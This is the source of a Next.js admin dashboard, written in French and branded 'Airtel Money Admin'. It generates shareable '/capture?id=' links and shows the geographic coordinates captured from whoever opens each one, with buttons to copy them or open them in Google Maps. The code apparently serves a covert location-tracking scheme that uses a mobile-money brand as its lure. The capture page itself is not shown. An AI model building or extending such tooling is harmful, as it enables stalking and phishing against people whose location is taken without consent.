'use client';

import { useState, useEffect } from 'react';
import { useRouter } from 'next/navigation';

export default function AdminPage() {
  const [isAuthenticated, setIsAuthenticated] = useState(false);
  const [password, setPassword] = useState('');
  const [links, setLinks] = useState<any[]>([]);
  const [locations, setLocations] = useState<any[]>([]);
  const [newLinkName, setNewLinkName] = useState('');
  const [newLinkUrl, setNewLinkUrl] = useState('');
  const [toast, setToast] = useState({ message: '', type: '' });

  const router = useRouter();

  const showToast = (message: string, type: string) => {
    setToast({ message, type });
    setTimeout(() => setToast({ message: '', type: '' }), 3000);
  };

  const fetchData = async () => {
    try {
      const [linksRes, locsRes] = await Promise.all([
        fetch('/api/links'),
        fetch('/api/locations'),
      ]);
      if (linksRes.ok && locsRes.ok) {
        setLinks(await linksRes.json());
        setLocations(await locsRes.json());
      } else {
        showToast('Erreur de chargement', 'error');
      }
    } catch {
      showToast('Erreur de chargement', 'error');
    }
  };

  // Vérifier l'authentification
  useEffect(() => {
    const checkAuth = async () => {
      const res = await fetch('/api/auth/check');
      if (res.ok) {
        setIsAuthenticated(true);
        fetchData();
      }
    };
    checkAuth();
  }, []);

  // Connexion
  const handleLogin = async (e: React.FormEvent) => {
    e.preventDefault();
    const res = await fetch('/api/auth/login', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ password }),
    });
    if (res.ok) {
      setIsAuthenticated(true);
      fetchData();
      showToast('Connexion réussie', 'success');
    } else {
      showToast('Mot de passe incorrect', 'error');
    }
  };

  // Déconnexion
  const handleLogout = async () => {
    await fetch('/api/auth/logout', { method: 'POST' });
    setIsAuthenticated(false);
    showToast('Déconnexion', 'info');
  };

  // Générer un lien
  const handleGenerateLink = async () => {
    try {
      const res = await fetch('/api/links', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ name: newLinkName }),
      });
      if (res.ok) {
        const link = await res.json();
        const fullUrl = `${window.location.origin}/capture?id=${link.id}`;
        setNewLinkUrl(fullUrl);
        setNewLinkName('');
        fetchData();
        showToast('Lien généré !', 'success');
      }
    } catch {
      showToast('Erreur', 'error');
    }
  };

  // Supprimer un lien
  const handleDeleteLink = async (id: string) => {
    if (!confirm('Supprimer ce lien ?')) return;
    const res = await fetch(`/api/links/${id}`, { method: 'DELETE' });
    if (res.ok) {
      fetchData();
      showToast('Lien supprimé', 'success');
    }
  };

  // Réinitialiser tout
  const handleResetAll = async () => {
    if (!confirm('Supprimer toutes les données ?')) return;
    const res = await fetch('/api/reset', { method: 'POST' });
    if (res.ok) {
      fetchData();
      showToast('Tout réinitialisé', 'info');
    }
  };

  const copyCoords = (coords: string) => {
    navigator.clipboard.writeText(coords);
    showToast('Coordonnées copiées', 'success');
  };

  const openInMaps = (lat: number, lng: number) => {
    window.open(`https://www.google.com/maps?q=${lat},${lng}`, '_blank');
  };

  // Formulaire de connexion
  if (!isAuthenticated) {
    return (
      <div className="min-h-screen flex items-center justify-center bg-gray-100">
        <div className="bg-white p-8 rounded-lg shadow-md w-96">
          <h1 className="text-2xl font-bold text-center text-red-600 mb-6">Airtel Money Admin</h1>
          <form onSubmit={handleLogin}>
            <input
              type="password"
              placeholder="Mot de passe"
              value={password}
              onChange={(e) => setPassword(e.target.value)}
              className="w-full p-3 border rounded-lg mb-4 focus:outline-none focus:ring-2 focus:ring-red-600"
            />
            <button type="submit" className="w-full bg-red-600 text-white p-3 rounded-lg hover:bg-red-700">
              Se connecter
            </button>
          </form>
          {toast.message && (
            <div className={`mt-4 p-2 text-center rounded ${toast.type === 'error' ? 'bg-red-100 text-red-700' : 'bg-green-100 text-green-700'}`}>
              {toast.message}
            </div>
          )}
        </div>
      </div>
    );
  }

  // Vue admin authentifiée
  return (
    <div className="container mx-auto p-4 max-w-6xl">
      <div className="flex justify-between items-center mb-6">
        <h1 className="text-3xl font-bold text-red-600">Airtel Money Admin</h1>
        <button onClick={handleLogout} className="btn btn-secondary btn-sm">
          <i className="fas fa-sign-out-alt"></i> Déconnexion
        </button>
      </div>

      {/* Génération de lien */}
      <div className="card">
        <h2 className="text-xl font-bold mb-4">Générer un lien</h2>
        <div className="flex gap-2 flex-wrap">
          <input
            type="text"
            placeholder="Nom (optionnel)"
            value={newLinkName}
            onChange={(e) => setNewLinkName(e.target.value)}
            className="flex-1 min-w-[200px]"
          />
          <button onClick={handleGenerateLink} className="btn">
            <i className="fas fa-plus-circle"></i> Générer
          </button>
        </div>
        {newLinkUrl && (
          <div className="mt-4 p-3 bg-gray-100 rounded flex justify-between items-center">
            <code className="text-sm break-all">{newLinkUrl}</code>
            <button
              onClick={() => navigator.clipboard.writeText(newLinkUrl)}
              className="text-red-600 hover:text-red-800"
            >
              <i className="fas fa-copy"></i>
            </button>
          </div>
        )}
      </div>

      {/* Tableau des liens */}
      <div className="card">
        <h2 className="text-xl font-bold mb-4">Liens générés</h2>
        <div className="overflow-x-auto">
          <table className="w-full">
            <thead>
              <tr>
                <th>ID</th>
                <th>Nom</th>
                <th>Statut</th>
                <th>Localisation</th>
                <th>Date</th>
                <th>Actions</th>
              </tr>
            </thead>
            <tbody>
              {links.map((link) => {
                const loc = locations.find(l => l.link_id === link.id);
                return (
                  <tr key={link.id}>
                    <td className="font-mono text-xs">{link.id}</td>
                    <td>{link.name}</td>
                    <td>
                      <span className={`badge ${loc ? 'badge-captured' : 'badge-pending'}`}>
                        {loc ? '📍 Capturée' : '⏳ En attente'}
                      </span>
                    </td>
                    <td>{loc ? loc.coords : '—'}</td>
                    <td>{loc ? new Date(loc.captured_at).toLocaleString() : new Date(link.created_at).toLocaleString()}</td>
                    <td>
                      <div className="flex gap-2">
                        {loc && (
                          <>
                            <button
                              onClick={() => copyCoords(loc.coords)}
                              className="action-btn copy"
                              title="Copier"
                            >
                              <i className="fas fa-copy"></i>
                            </button>
                            <button
                              onClick={() => openInMaps(loc.lat, loc.lng)}
                              className="action-btn maps"
                              title="Maps"
                            >
                              <i className="fas fa-map-marked-alt"></i>
                            </button>
                          </>
                        )}
                        <button
                          onClick={() => handleDeleteLink(link.id)}
                          className="action-btn delete"
                          title="Supprimer"
                        >
                          <i className="fas fa-trash-alt"></i>
                        </button>
                      </div>
                    </td>
                  </tr>
                );
              })}
            </tbody>
          </table>
        </div>
        {links.length === 0 && <p className="text-center text-gray-500 py-8">Aucun lien généré.</p>}
        <div className="mt-4 text-right">
          <button onClick={handleResetAll} className="btn btn-outline btn-sm">
            <i className="fas fa-trash-alt"></i> Réinitialiser tout
          </button>
        </div>
      </div>

      {/* Toast */}
      {toast.message && (
        <div className={`toast show ${toast.type}`}>{toast.message}</div>
      )}
    </div>
  );
}